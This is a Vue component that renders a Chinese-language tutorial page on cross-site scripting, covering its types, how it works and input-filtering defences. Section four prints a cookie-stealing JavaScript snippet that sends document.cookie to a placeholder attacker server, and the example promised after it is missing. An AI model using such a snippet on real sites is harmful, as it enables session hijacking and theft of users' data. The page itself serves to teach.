<template>
  <div id="xss">
    <h3>一、简介</h3>
    <h4>
      什么是XSS?
      百度百科的解释: XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。
      它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制，获取用户的一些信息。
    </h4>
    <h3>二、分类</h3>
    <h4>
      xss攻击可以分成两种类型：
      <br>1.非持久型攻击
      <br>2.持久型攻击
      <br>非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。
      持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。
      也可以分成三类:
      反射型：经过后端，不经过数据库
      存储型：经过后端，经过数据库
      DOM：不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。
    </h4>
    <h3>三、原理</h3>
    <h4>
      第一、XSS反射型攻击，恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的。
      <br>第二、XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛等社交网站上，但OA系统，和CRM系统上也能看到它身影，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，黑客提交了恶意攻击代码，当系统管理员查看投诉信息时恶意代码执行，窃取了客户的资料，然而管理员毫不知情，这就是典型的XSS存储型攻击。
    </h4>
    <h3>四、XSS攻击能做些什么</h3>
    <h4>
      1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：
      <i>
        var i=document.createElement("img");
        <br>document.body.appendChild(i);
        <br>i.src = "http://www.hackerserver.com/?c=" + document.cookie;
        <br>
      </i>
      2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等，如代码：
    </h4>
    <h3>解决方法</h3>
    <h4>
      后台过滤：
      一种方法是在表单提交或者url参数传递前，对需要的参数进行过滤,XSS过滤工具类代码
      <br>前台过滤：
      过滤用户输入的 检查用户输入的内容中是否有非法内容。如&lt&gt（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。、严格控制输出
      <br>
    </h4>
  </div>
</template>
<script>
export default {
  data() {
    return {};
  },
  mounted() {},
  methods: {}
};
</script>
<style lang="less" scoped>
  @h3Color: green;
  @h4Color: #e3c93c;
  #xss{
    h3{
      color: @h3Color;
    }
    h4{
      color: @h4Color;
      i{
        display: block;
        background-color: #222;
        color:#fff;
      }
    }
  }

</style>
